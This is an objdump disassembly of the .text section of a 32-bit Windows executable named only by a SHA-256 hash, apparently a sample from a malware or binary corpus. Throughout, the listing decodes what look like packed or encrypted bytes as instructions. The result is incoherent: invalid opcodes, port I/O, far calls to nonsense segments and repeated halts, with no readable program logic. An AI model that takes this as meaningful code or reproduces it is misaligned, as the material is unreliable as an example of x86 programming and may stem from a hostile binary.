
629f7f3824f57fa62e538b8df3d1ad21ca70c8e5a21d3f1cc7c435a4dcfb9551.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	out    0x77,eax
  401002:	pusha  
  401003:	(bad)  
  401004:	in     al,dx
  401005:	mov    al,ds:0x1200b646
  40100a:	and    dh,BYTE PTR ds:0xb71fa106
  401010:	test   eax,0xea25a143
  401015:	push   esp
  401016:	(bad)  
  401017:	cld    
  401018:	jnp    0x401075
  40101a:	jb     0x400fb7
  40101c:	mov    cl,0xb
  40101e:	call   0xd1ce:0xee78cbea
  401025:	sub    ebx,ecx
  401027:	enter  0x7bdf,0xe8
  40102b:	ret    0x78c1
  40102e:	cmc    
  40102f:	aad    0xb2
  401031:	in     al,dx
  401032:	lods   al,BYTE PTR ds:[esi]
  401033:	mov    ds:0x64b3e6b2,al
  401038:	ja     0x401045
  40103a:	dec    edx
  40103b:	mov    ds:0xc11bfeb2,eax
  401040:	aam    0xb
  401042:	call   0xdcd5:0xff60b2a7
  401049:	outs   dx,BYTE PTR ds:[esi]
  40104a:	not    BYTE PTR [eax+eax*4-0x213401db]
  401051:	or     esi,esp
  401053:	rcl    esi,cl
  401055:	test   BYTE PTR [bx+di+0x67d6],0xf6
  40105b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40105c:	out    0x80,eax
  40105e:	jbe    0x401027
  401060:	or     ebx,0x80baf211
  401066:	xlat   BYTE PTR ds:[ebx]
  401067:	stos   DWORD PTR es:[edi],eax
  401068:	mov    ebx,eax
  40106a:	out    dx,eax
  40106b:	lods   eax,DWORD PTR ds:[esi]
  40106c:	cmp    ecx,esi
  40106e:	xor    al,0xd2
  401070:	dec    edi
  401071:	inc    esp
  401072:	adc    DWORD PTR [eax-0x67],ebp
  401075:	shr    DWORD PTR [ebp+0x77],0x80
  401079:	or     eax,ebx
  40107b:	adc    al,0xba
  40107d:	fidiv  DWORD PTR [edx-0x2c]
  401080:	mov    bh,0x3e
  401082:	mov    edx,0x64e60a24
  401087:	ins    BYTE PTR es:[edi],dx
  401088:	xbegin 0xdb855c06
  40108e:	adc    esp,ebx
  401090:	xchg   esi,eax
  401091:	pop    ss
  401092:	sti    
  401093:	outs   dx,BYTE PTR ds:[esi]
  401094:	jo     0x401099
  401096:	call   0x4a63:0x1be739f2
  40109d:	cmc    
  40109e:	gs pop eax
  4010a0:	ror    ah,cl
  4010a2:	pop    ds
  4010a3:	pop    edi
  4010a4:	dec    esp
  4010a5:	hlt    
  4010a6:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4010a8:	mov    dl,0xb
  4010aa:	call   0x36a8:0x9a03cf24
  4010b1:	lods   al,BYTE PTR ds:[esi]
  4010b2:	call   0x3faf:0xef80b2a7
  4010b9:	mov    dh,0x9a
  4010bb:	pop    eax
  4010bc:	dec    ebp
  4010bd:	hlt    
  4010be:	and    esp,DWORD PTR [edi+0xb9a0bb3]
  4010c4:	mov    cs,WORD PTR [edx-0x18]
  4010c7:	mov    eax,ds:0xa5ed518e
  4010cc:	sahf   
  4010cd:	jmp    0x4010ff
  4010cf:	lods   eax,DWORD PTR ds:[esi]
  4010d0:	jb     0x401151
  4010d2:	xchg   ebx,eax
  4010d3:	out    dx,al
  4010d4:	mov    ebp,0xb2a7188f
  4010d9:	or     esi,DWORD PTR [ecx+0x40]
  4010dc:	aas    
  4010dd:	mov    esi,0xf44d589a
  4010e2:	mov    cl,0x59
  4010e4:	xor    esp,esi
  4010e6:	fwait
  4010e7:	rol    ecx,1
  4010e9:	popa   
  4010ea:	call   0x4d58:0x65605af1
  4010f1:	sbb    BYTE PTR [edi],0x5b
  4010f4:	dec    esp
  4010f5:	hlt    
  4010f6:	gs ret 
  4010f8:	cmp    DWORD PTR [esi],ebx
  4010fa:	stos   BYTE PTR es:[edi],al
  4010fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4010fc:	mov    dl,0xb
  4010fe:	adc    ebp,esi
  401100:	mov    esi,0x39abc880
  401105:	shl    DWORD PTR [ecx-0x5f],1
  401108:	cmp    DWORD PTR [ecx],ebx
  40110a:	mov    eax,ds:0x1145c674
  40110f:	aad    0x82
  401111:	xchg   BYTE PTR [edi],ah
  401113:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401114:	dec    ebp
  401115:	hlt    
  401116:	gs push ds
  401118:	mov    dl,0xa
  40111a:	call   0xd44f:0xeefdb9a7
  401121:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401122:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401123:	out    0xc0,al
  401125:	or     eax,0x9c5fda6
  40112a:	mov    dh,0x47
  40112c:	sbb    BYTE PTR [ecx],al
  40112e:	pop    edx
  40112f:	shl    DWORD PTR [edi+0x5973ee42],cl
  401135:	loope  0x40114e
  401137:	adc    dh,BYTE PTR [edx-0x66a79a0c]
  40113d:	cmc    
  40113e:	sbb    DWORD PTR [eax-0x4d],ebx
  401141:	jge    0x4011a2
  401143:	int    0xb2
  401145:	pop    ebp
  401146:	jb     0x4010fe
  401148:	dec    ebp
  401149:	hlt    
  40114a:	gs pushf 
  40114c:	aaa    
  40114d:	mul    DWORD PTR [eax+ebx*2+0x4d]
  401151:	jle    0x401182
  401153:	sub    al,0xf0
  401155:	adc    edx,DWORD PTR [ebx]
  401157:	and    cl,BYTE PTR [edx-0xb]
  40115a:	gs pop eax
  40115c:	rol    DWORD PTR [eax-0xbb3a0e1],cl
  401162:	outs   dx,BYTE PTR gs:[esi]
  401164:	jo     0x401175
  401166:	call   0xd267:0xa9e739f2
  40116d:	xor    bl,bh
  40116f:	scas   eax,DWORD PTR es:[edi]
  401170:	mov    BYTE PTR [ecx+0x11],0xfa
  401174:	mov    edx,0x399bc108
  401179:	push   eax
  40117a:	loop   0x401120
  40117c:	out    dx,eax
  40117d:	add    edx,DWORD PTR [ecx]
  40117f:	aam    0x92
  401181:	or     bh,ch
  401183:	scas   eax,DWORD PTR es:[edi]
  401184:	sbb    ecx,0x78aaf4a1
  40118a:	stos   DWORD PTR es:[edi],eax
  40118b:	or     dh,BYTE PTR [ecx-0x4d326db2]
  401191:	pop    ebx
  401192:	jb     0x4011f6
  401194:	dec    esp
  401195:	hlt    
  401196:	gs sahf 
  401198:	test   DWORD PTR [edi],0xe0f0a4ee
  40119e:	jge    0x401216
  4011a0:	push   eax
  4011a1:	or     cl,cl
  4011a3:	xor    DWORD PTR [ecx+0x5a8925e],0x9
  4011aa:	pop    ebx
  4011ab:	inc    edi
  4011ac:	mov    al,0x8
  4011ae:	fnstcw WORD PTR [ebx+0x2c924eb1]
  4011b4:	mov    dl,0x8
  4011b6:	fild   QWORD PTR [edi-0x4441b0c5]
  4011bc:	rol    edx,cl
  4011be:	pop    eax
  4011bf:	scas   eax,DWORD PTR es:[edi]
  4011c0:	mov    dl,0x5e
  4011c2:	adc    DWORD PTR [ebx+0x4d],ecx
  4011c5:	jle    0x40115d
  4011c7:	pop    eax
  4011c8:	mov    DWORD PTR [ebx],0xf44d3f72
  4011ce:	outs   dx,BYTE PTR gs:[esi]
  4011d0:	xor    eax,0xf620be0f
  4011d5:	das    
  4011d6:	xchg   edx,eax
  4011d7:	gs mov dh,0xb
  4011da:	iret   
  4011db:	sub    al,0x5e
  4011dd:	mov    BYTE PTR [esi+0x4b],bl
  4011e0:	shl    bl,cl
  4011e2:	call   0x968b:0x1b0bb2a7
  4011e9:	cdq    
  4011ea:	mov    edi,esp
  4011ec:	mov    dl,0x50
  4011ee:	pop    ss
  4011ef:	and    al,0x4c
  4011f1:	sbb    bl,dl
  4011f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4011f4:	loop   0x4011d9
  4011f6:	pop    es
  4011f7:	pop    ecx
  4011f8:	dec    ebp
  4011f9:	hlt    
  4011fa:	adc    esp,edx
  4011fc:	dec    esi
  4011fd:	arpl   WORD PTR [ebp-0x29],cx
  401200:	push   ss
  401201:	cmp    al,0x65
  401203:	ror    BYTE PTR [esi-0x1d],cl
  401206:	(bad)  
  401207:	pop    eax
  401208:	dec    ebp
  401209:	hlt    
  40120a:	adc    esp,edx
  40120c:	dec    edx
  40120d:	arpl   ax,dx
  40120f:	ss and eax,0x4ed265fc
  401215:	jecxz  0x4011ee
  401217:	pop    eax
  401218:	dec    ebp
  401219:	hlt    
  40121a:	adc    esp,edx
  40121c:	inc    esi
  40121d:	sbb    bh,0x5b
  401220:	mov    cl,0x4b
  401222:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401223:	test   al,0x5
  401225:	pop    ebx
  401226:	mov    gs,WORD PTR [edx]
  401228:	test   BYTE PTR [ecx],0x82
  40122b:	sub    al,0xe2
  40122d:	pop    es
  40122e:	cdq    
  40122f:	repnz dec esi
  401231:	or     bh,0x57
  401234:	mov    cl,0x5b
  401236:	mov    ch,BYTE PTR [esi]
  401238:	out    0xe7,eax
  40123a:	adc    edx,ebx
  40123c:	pop    esi
  40123d:	sub    bh,0x57
  401240:	mov    esp,edi
  401242:	out    dx,al
  401243:	ret    0x371e
  401246:	jb     0x40121a
  401248:	inc    ebp
  401249:	sbb    BYTE PTR [edx+ebp*1-0x6361c40a],0xf7
  401251:	repz out dx,eax
  401253:	dec    ebx
  401254:	or     ebp,DWORD PTR [ebx]
  401256:	call   0xf85a:0xcc86b2a7
  40125d:	ins    DWORD PTR es:[edi],dx
  40125e:	sbb    ebx,DWORD PTR [ebp-0x5c11fd28]
  401264:	push   eax
  401265:	std    
  401266:	jno    0x4012e7
  401268:	clc    
  401269:	mov    esp,DWORD PTR [eax+0x1113c74f]
  40126f:	in     eax,dx
  401270:	mov    bl,0x86
  401272:	(bad)  
  401273:	mov    dh,0xb7
  401275:	xor    bh,dl
  401277:	push   edi
  401278:	rol    BYTE PTR [edi],0xa1
  40127b:	jmp    0xffff:0x9c9d785e
  401282:	out    dx,al
  401283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401284:	pop    ecx
  401285:	mov    cl,0x1b
  401287:	popf   
  401288:	and    bl,BYTE PTR [ebx+0x1dc6370a]
  40128e:	adc    DWORD PTR [ebp+0x576afb97],esp
  401294:	inc    edx
  401295:	ss retf 0xe2f7
  401299:	pop    ebx
  40129a:	out    dx,eax
  40129b:	mov    eax,ds:0x4c647132
  4012a0:	(bad)  
  4012a1:	push   cs
  4012a2:	jno    0x401307
  4012a4:	xor    ecx,ecx
  4012a6:	sahf   
  4012a7:	pop    eax
  4012a8:	pusha  
  4012a9:	push   0x53
  4012ab:	gs mov dh,0xb
  4012ae:	iret   
  4012af:	sub    al,0x5e
  4012b1:	imul   edx,DWORD PTR [ecx],0xffffffd2
  4012b4:	mov    esi,0x4eafe780
  4012b9:	mov    ecx,0xaf69941a
  4012be:	sub    DWORD PTR [ebp-0x586599a6],esp
  4012c4:	mov    dl,0x78
  4012c6:	ins    BYTE PTR es:[edi],dx
  4012c7:	xchg   esp,eax
  4012c8:	jnp    0x4012ad
  4012ca:	(bad)  
  4012cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4012cc:	mov    dl,0xb
  4012ce:	jmp    0x730b948e
  4012d3:	cld    
  4012d4:	mov    dl,0xb
  4012d6:	call   0x2e6:0x98b891d4
  4012dd:	sbb    esi,DWORD PTR [edx-0x18]
  4012e0:	mov    dl,0xb
  4012e2:	call   0x8dd2:0x6d7872b5
  4012e9:	mov    eax,ds:0x465a7371
  4012ee:	call   0xa2d2:0x5120b2a7
  4012f5:	jecxz  0x4012cf
  4012f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4012f8:	mov    dl,0xb
  4012fa:	jno    0x40128b
  4012fc:	push   ds
  4012fd:	fidiv  DWORD PTR [edx-0x2d]
  401300:	call   FWORD PTR [eax]
  401302:	push   ebx
  401303:	dec    esp
  401304:	scas   al,BYTE PTR es:[edi]
  401305:	call   0x4f36:0x35266d2
  40130c:	sahf   
  40130d:	or     ebx,DWORD PTR [edx-0x18f47059]
  401313:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401314:	mov    dl,0x78
  401316:	nop
  401317:	daa    
  401318:	dec    esi
  401319:	push   cs
  40131a:	jmp    0xe63344c0
  40131f:	shl    BYTE PTR [eax+0x3932db4a],1
  401325:	into   
  401326:	sub    DWORD PTR [esi-0x73927f1c],esp
  40132c:	inc    edx
  40132d:	clc    
  40132e:	ds stc 
  401330:	pop    ecx
  401331:	test   DWORD PTR [eax+0x100ec775],ebx
  401337:	mov    cl,0xf4
  401339:	sbb    DWORD PTR [eax+0x64],ecx
  40133c:	add    edx,0xf45c4fdb
  401342:	gs pop eax
  401344:	mov    eax,ds:0x4d4072c2
  401349:	hlt    
  40134a:	gs aad 0x40
  40134d:	enter  0xdbb1,0x96
  401351:	and    edx,DWORD PTR [ebx]
  401353:	fist   DWORD PTR [esi+0x706efb17]
  401359:	add    ebx,DWORD PTR [edx+0x19e739f2]
  40135f:	arpl   WORD PTR [edx+0x6b],ax
  401362:	adc    edx,esp
  401364:	mov    edx,0x4d579a2e
  401369:	hlt    
  40136a:	cld    
  40136b:	mov    al,BYTE PTR es:[esi-0x40]
  40136f:	shl    BYTE PTR [ecx+0x339bca80],cl
  401375:	icebp  
  401376:	call   0xd4af:0xe90bb2b7
  40137d:	mov    ah,BYTE PTR [esi-0x11b11d5b]
  401383:	mov    al,ds:0xa78a0b9f
  401388:	mov    dl,0xe0
  40138a:	inc    ebp
  40138b:	test   DWORD PTR cs:[ebx],0xbb2a772
  401392:	call   0xf2b2:0xa52f9e26
  401399:	or     eax,ecx
  40139b:	sub    dh,BYTE PTR [ecx]
  40139d:	cli    
  40139e:	mov    esp,edi
  4013a0:	mov    dl,0x5b
  4013a2:	jb     0x4013fb
  4013a4:	dec    esi
  4013a5:	hlt    
  4013a6:	gs cs idiv ebx
  4013aa:	and    ecx,DWORD PTR [edi-0x5b65f44c]
  4013b0:	cmp    esi,edx
  4013b2:	mov    esp,edi
  4013b4:	mov    dl,0x82
  4013b6:	xlat   BYTE PTR ds:[ebx]
  4013b7:	pop    edi
  4013b8:	fmul   DWORD PTR [ebx-0xe]
  4013bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4013bc:	or     BYTE PTR [ebx],0x9a
  4013bf:	neg    al
  4013c1:	or     esi,edx
  4013c3:	in     eax,dx
  4013c4:	mov    edi,0xc75893c5
  4013c9:	sti    
  4013ca:	jb     0x401421
  4013cc:	dec    edi
  4013cd:	hlt    
  4013ce:	gs cs div edi
  4013d2:	pop    ss
  4013d3:	adc    al,0x72
  4013d5:	sbb    bl,dl
  4013d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4013d8:	cmp    DWORD PTR [esi+0x66],esi
  4013db:	sub    al,0xff
  4013dd:	repz cdq 
  4013df:	js     0x40137a
  4013e1:	aad    0x69
  4013e3:	add    edi,DWORD PTR [edi]
  4013e5:	mov    BYTE PTR [edx],al
  4013e7:	mov    dl,0xf2
  4013e9:	or     esp,DWORD PTR [ebp+0x47]
  4013ec:	aas    
  4013ed:	mov    eax,0xbf2b072
  4013f2:	gs adc al,0x6f
  4013f5:	sbb    bl,dl
  4013f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4013f8:	in     al,0xe3
  4013fa:	les    ebx,FWORD PTR [ebx+0x4d]
  4013fd:	hlt    
  4013fe:	mov    eax,ds:0xda1a5324
  401403:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401404:	mov    ebp,0xb2a5b98e
  401409:	or     esp,DWORD PTR [ebp+0x14]
  40140c:	push   edi
  40140d:	sbb    bl,dl
  40140f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401410:	fmul   DWORD PTR [ebx-0xe]
  401413:	xchg   esi,eax
  401414:	(bad)  
  401415:	mov    bh,0xe5
  401417:	pop    eax
  401418:	(bad)  
  401419:	sti    
  40141a:	jb     0x401421
  40141c:	dec    edi
  40141d:	hlt    
  40141e:	gs cs idiv edi
  401422:	xchg   ecx,eax
  401423:	addr16 mov ebp,0xb2a5998f
  401429:	or     edx,DWORD PTR [ecx]
  40142b:	pop    edi
  40142c:	in     al,0x5c
  40142e:	jb     0x40140c
  401430:	dec    esp
  401431:	hlt    
  401432:	gs pushf 
  401434:	xor    esi,ebp
  401436:	mov    esp,edi
  401438:	mov    dl,0x4
  40143a:	pop    ds
  40143b:	dec    ecx
  40143c:	mov    bl,0xb
  40143e:	call   0x4d5b:0x8ce3e5f7
  401445:	hlt    
  401446:	mov    eax,ds:0xda1a5b24
  40144b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40144c:	mov    ebp,0xb2a6418e
  401451:	or     edx,DWORD PTR [ecx]
  401453:	sar    BYTE PTR [edx+0xb53e780],cl
  401459:	aaa    
  40145a:	call   0xc09e:0x9632b2a7
  401461:	or     DWORD PTR [ecx+0x3],ebp
  401464:	cmp    DWORD PTR [esi-0x6e],edi
  401467:	sub    al,0xcf
  401469:	call   FWORD PTR [ecx-0x13f77128]
  40146f:	fwait
  401470:	aam    0x80
  401472:	fdiv   QWORD PTR [ecx-0x4e227d2c]
  401478:	cmp    DWORD PTR [esi+0x6e],eax
  40147b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40147c:	sti    
  40147d:	aaa    
  40147e:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401480:	out    0x61,al
  401482:	ficomp DWORD PTR [eax-0x3d]
  401485:	pop    ebx
  401486:	sar    BYTE PTR gs:[edx-0x4b374a9d],cl
  40148d:	sbb    esp,DWORD PTR [ebp-0x2e]
  401490:	inc    edx
  401491:	jecxz  0x401444
  401493:	pop    edx
  401494:	dec    ebp
  401495:	hlt    
  401496:	ret    0xcf2c
  401499:	add    edx,DWORD PTR [ecx]
  40149b:	rol    BYTE PTR [esi-0x80],cl
  40149e:	push   esp
  40149f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4014a0:	cld    
  4014a1:	aaa    
  4014a2:	adc    esi,ebp
  4014a4:	out    0xf8,al
  4014a6:	ds sub al,0xef
  4014a9:	add    ebx,DWORD PTR [ecx+0x2d048efc]
  4014af:	in     al,dx
  4014b0:	mov    ah,0x4
  4014b2:	sub    eax,0xee86a6d4
  4014b7:	mov    ecx,0x2ccb5daa
  4014bc:	iret   
  4014bd:	add    ebx,DWORD PTR [ecx-0x2b7f4127]
  4014c3:	scas   eax,DWORD PTR es:[edi]
  4014c4:	cmp    DWORD PTR [eax-0x5e],ecx
  4014c7:	out    dx,eax
  4014c8:	mov    cl,0xc3
  4014ca:	ins    DWORD PTR es:[edi],dx
  4014cb:	ja     0x40145e
  4014cd:	ret    
  4014ce:	pop    ebx
  4014cf:	dec    esi
  4014d0:	mov    al,0x38
  4014d2:	pop    edx
  4014d3:	push   esp
  4014d4:	sbb    DWORD PTR [eax+0x7539b7d4],eax
  4014da:	xchg   esi,eax
  4014db:	sub    al,0xc4
  4014dd:	pop    ds
  4014de:	cdq    
  4014df:	rol    BYTE PTR [esi+0x8],cl
  4014e2:	out    0xaf,eax
  4014e4:	inc    ecx
  4014e5:	scas   eax,DWORD PTR es:[edi]
  4014e6:	ret    
  4014e7:	stc    
  4014e8:	xor    ebp,ecx
  4014ea:	mov    dl,0x45
  4014ec:	jle    0x4014e2
  4014ee:	out    dx,eax
  4014ef:	push   ebx
  4014f0:	ficom  DWORD PTR [esi-0xb2e337c]
  4014f6:	out    dx,eax
  4014f7:	push   edi
  4014f8:	pop    edx
  4014f9:	iret   
  4014fa:	pop    ax
  4014fc:	dec    ebp
  4014fd:	adc    BYTE PTR [ecx],0x23
  401500:	mov    dl,0xb
  401502:	call   0xb227:0x180d944
  401509:	or     ebx,DWORD PTR [edx+0x1103efa4]
  40150f:	aam    0xbe
  401511:	add    BYTE PTR [ebx+edx*8-0x17],ch
  401515:	or     bh,ch
  401517:	scas   eax,DWORD PTR es:[edi]
  401518:	in     al,0xe3
  40151a:	jecxz  0x401578
  40151c:	dec    ebp
  40151d:	hlt    
  40151e:	xchg   ecx,eax
  40151f:	addr16 (bad) 
  401521:	sbb    esp,ecx
  401523:	iret   
  401524:	aas    
  401525:	mov    dh,0x5b
  401527:	cwde   
  401528:	dec    ebp
  401529:	jle    0x401595
  40152b:	dec    edi
  40152c:	and    esi,edi
  40152e:	gs pop eax
  401530:	mov    ecx,0x3990eecb
  401535:	fist   DWORD PTR [ecx]
  401537:	fsub   QWORD PTR [edx+0x44aca980]
  40153d:	jle    0x4014d7
  40153f:	sub    al,0x45
  401541:	or     bh,ch
  401543:	scas   eax,DWORD PTR es:[edi]
  401544:	mov    cl,0x76
  401546:	xchg   edx,eax
  401547:	or     bh,BYTE PTR [ecx-0x42471135]
  40154d:	mov    cl,0x6a
  40154f:	mov    eax,0xe2990ec0
  401554:	mov    edx,0xe2f5da4b
  401559:	pop    ecx
  40155a:	repnz pop eax
  40155c:	lods   eax,DWORD PTR ds:[esi]
  40155d:	ja     0x4015b2
  40155f:	pop    eax
  401560:	(bad)  
  401561:	sti    
  401562:	jb     0x401561
  401564:	dec    esi
  401565:	hlt    
  401566:	gs std 
  401568:	sbb    eax,esp
  40156a:	inc    esi
  40156b:	and    al,0x71
  40156d:	pop    ds
  40156e:	jno    0x4015a9
  401570:	cmp    DWORD PTR [esi-0x6e],ebx
  401573:	sub    al,0xef
  401575:	add    ebx,DWORD PTR [ecx-0x36df7104]
  40157b:	xchg   ebx,eax
  40157c:	(bad)  
  40157d:	pop    ebx
  40157e:	cld    
  40157f:	test   al,0x8
  401581:	push   0x43c0a78c
  401586:	sbb    DWORD PTR [esi+edx*1],ebx
  401589:	or     ebx,DWORD PTR [edx-0x5a804d59]
  40158f:	sub    al,0xc7
  401591:	add    ebx,DWORD PTR [ecx-0x65f4edec]
  401597:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401598:	cmp    DWORD PTR ds:0x80bada99,esi
  40159e:	aam    0xa3
  4015a0:	xor    edx,esp
  4015a2:	xchg   edx,eax
  4015a3:	jbe    0x401600
  4015a5:	call   0x6d5f2067
  4015aa:	aaa    
  4015ab:	rcr    DWORD PTR [ebx],0xb
  4015ae:	stos   BYTE PTR es:[edi],al
  4015af:	sar    DWORD PTR [edx-0x4d579ad2],cl
  4015b5:	or     ebx,DWORD PTR [ebx+0x74e98ab3]
  4015bb:	sub    al,0xf7
  4015bd:	add    ebx,DWORD PTR [ecx-0x65f4eddc]
  4015c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015c4:	mov    cl,0x88
  4015c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015c8:	mov    dl,0xb
  4015ca:	mov    eax,ds:0x11c1c057
  4015cf:	sub    al,0x76
  4015d1:	or     ebx,DWORD PTR [edx+0x650351a7]
  4015d7:	sar    BYTE PTR [edx+0x4d5c66e3],cl
  4015dd:	hlt    
  4015de:	inc    BYTE PTR [esi]
  4015e0:	or     BYTE PTR [ebx],0x9a
  4015e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015e4:	cmp    DWORD PTR [ebx-0x6a],ecx
  4015e7:	sub    al,0xf2
  4015e9:	pop    es
  4015ea:	adc    edi,ebp
  4015ec:	stos   BYTE PTR es:[edi],al
  4015ed:	or     bh,0xaf
  4015f0:	mov    ebx,DWORD PTR [ebx-0x7e]
  4015f3:	sar    DWORD PTR [ebx-0x5616580],cl
  4015f9:	adc    ebp,edi
  4015fb:	push   ebx
  4015fc:	pop    ecx
  4015fd:	and    al,0x11
  4015ff:	in     al,dx
  401600:	call   0x8643:0x3bafd708
  401607:	dec    DWORD PTR cs:[edi]
  40160a:	pop    ebp
  40160b:	out    0x92,eax
  40160d:	or     bl,BYTE PTR [edx+0x6d6db2a7]
  401613:	in     al,0xa4
  401615:	or     edi,DWORD PTR [edx-0x20334a2e]
  40161b:	mov    bh,0xb2
  40161d:	or     ebx,DWORD PTR [edx-0x41b08a59]
  401623:	mov    ebx,0xa79a0bb2
  401628:	rol    edx,cl
  40162a:	pop    eax
  40162b:	mov    ds:0xcf9a61b2,eax
  401630:	jle    0x4015ce
  401632:	mov    al,BYTE PTR [edx+0x4f6a7e4d]
  401638:	aaa    
  401639:	lock gs pop eax
  40163c:	push   DWORD PTR [ebx]
  40163e:	shl    BYTE PTR [edi],0x8a
  401641:	or     ah,bh
  401643:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401644:	mov    dh,0x2
  401646:	jmp    0x4016a0
  401648:	xor    esi,DWORD PTR [ebx+0x4bb33658]
  40164e:	pop    eax
  40164f:	mov    dl,0x71
  401651:	add    ebx,DWORD PTR [ebx-0x7afa4557]
  401657:	sbb    eax,0xae2e0ace
  40165c:	jg     0x401688
  40165e:	and    dl,BYTE PTR [edx-0x2]
  401661:	mov    edx,DWORD PTR [eax-0x169d250d]
  401667:	xchg   edx,eax
  401669:	pop    ss
  40166a:	call   0xfc04ec37
  40166f:	retf   0x68bc
  401672:	adc    al,0xc9
  401674:	mov    WORD PTR [esi+ebp*8-0x3a912f98],ss
  40167b:	cmp    edi,eax
  40167d:	mov    ah,0xaa
  40167f:	into   
  401680:	mov    ah,0x4f
  401682:	aad    0xf4
  401684:	dec    esi
  401685:	popfw  
  401687:	enter  0x6ed6,0xb4
  40168b:	stos   BYTE PTR es:[edi],al
  40168c:	mov    al,ds:0xf63fbe01
  401691:	jg     0x40162f
  401693:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401694:	repnz lock stos BYTE PTR es:[edi],al
  401697:	rcr    BYTE PTR [ebx+eiz*4-0xe665cd6],0xe6
  40169f:	pop    ss
  4016a0:	out    0x22,al
  4016a2:	xchg   edx,eax
  4016a3:	and    ecx,DWORD PTR [edx+0x41]
  4016a6:	sbb    al,0xdb
  4016a8:	aaa    
  4016a9:	dec    edi
  4016aa:	xchg   al,bh
  4016ac:	repnz sbb ch,BYTE PTR [edi-0xdeb74d1]
  4016b3:	or     bh,BYTE PTR [edx-0x58e5fafd]
  4016b9:	es scas al,BYTE PTR es:[edi]
  4016bb:	cdq    
  4016bc:	popf   
  4016bd:	jo     0x4016ba
  4016bf:	shl    DWORD PTR [edx+0x439bddc7],0x35
  4016c6:	leave  
  4016c7:	xchg   edi,eax
  4016c8:	xor    ebp,ecx
  4016ca:	loope  0x4016cc
  4016cc:	mov    edx,0x80965ebf
  4016d1:	mov    eax,0x23dbf582
  4016d6:	stc    
  4016d7:	iret   
  4016d8:	rol    BYTE PTR [esi+0x4ee2e556],cl
  4016de:	cwde   
  4016df:	jmp    0x401694
  4016e1:	dec    ebx
  4016e2:	nop
  4016e3:	mov    ds:0xe86920c8,al
  4016e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016e9:	pop    ss
  4016ea:	jp     0x40168c
  4016ec:	mov    al,0xa
  4016ee:	xchg   ecx,eax
  4016ef:	cmp    DWORD PTR [eax-0x533c2ce7],0xa6a17e1e
  4016f9:	adc    cl,BYTE PTR [edi+0x3]
  4016fc:	mov    ecx,0x32ae131b
  401701:	push   gs
  401703:	xor    DWORD PTR [edi+eax*1+0xec2a198],0x4153aa08
  40170e:	xchg   edx,eax
  40170f:	ret    
  401710:	enter  0x1600,0xf2
  401714:	mov    bh,BYTE PTR [edx]
  401716:	pop    ds
  401717:	mov    ds:0x61b4b8d,al
  40171c:	loope  0x401745
  40171e:	mov    ecx,0xa60406af
  401723:	daa    
  401724:	fisubr WORD PTR [edi+0x22]
  401727:	(bad)  
  401728:	jae    0x4016ad
  40172a:	adc    eax,DWORD PTR [edi]
  40172c:	ja     0x401749
  40172e:	xor    DWORD PTR [eax+0x77a9aa9d],esi
  401734:	adc    BYTE PTR [ebx],0x1f
  401737:	popf   
  401738:	mov    bl,0xab
  40173a:	mov    ah,0xd3
  40173c:	xlat   BYTE PTR ds:[ebx]
  40173d:	js     0x401721
  40173f:	inc    esi
  401740:	mov    ds:0x23ff919b,eax
  401745:	stos   DWORD PTR es:[edi],eax
  401746:	leave  
  401747:	mov    ds:0xe48a5b0a,eax
  40174c:	xchg   esi,eax
  40174d:	cmp    esi,ecx
  40174f:	lods   eax,DWORD PTR ds:[esi]
  401750:	push   edi
  401751:	sub    ebx,ecx
  401753:	imul   ebx,DWORD PTR [ecx+edi*2-0x712eca17],0xafd59797
  40175e:	sahf   
  40175f:	(bad)  
  401760:	imul   BYTE PTR [edi+0x23baca9e]
  401766:	push   DWORD PTR [ebp-0x3c069b22]
  40176c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40176d:	pop    ebx
  40176e:	cs scas eax,DWORD PTR es:[edi]
  401770:	cmp    ch,al
  401772:	mov    dl,0x76
  401774:	repnz or BYTE PTR [edx+0x22],bl
  401778:	fmul   DWORD PTR [edx]
  40177a:	and    DWORD PTR [ebp+0x3933a22],esi
  401780:	popf   
  401781:	adc    esp,DWORD PTR [eax-0x73]
  401784:	adc    BYTE PTR [ebx],cl
  401786:	inc    eax
  401787:	ror    DWORD PTR [edi],cl
  401789:	inc    esp
  40178a:	shl    BYTE PTR [ecx+ebx*1+0x3c],1
  40178e:	xchg   DWORD PTR [ecx],eax
  401790:	cmp    DWORD PTR [eax-0x42158e63],edi
  401796:	pop    edx
  401797:	idiv   DWORD PTR [eax-0x7a]
  40179a:	xchg   ebx,eax
  40179b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40179c:	pop    ecx
  40179d:	test   BYTE PTR [esi+0x775ca1ee],ah
  4017a3:	mov    ds:0x97d121b2,eax
  4017a8:	enter  0x6dbc,0x17
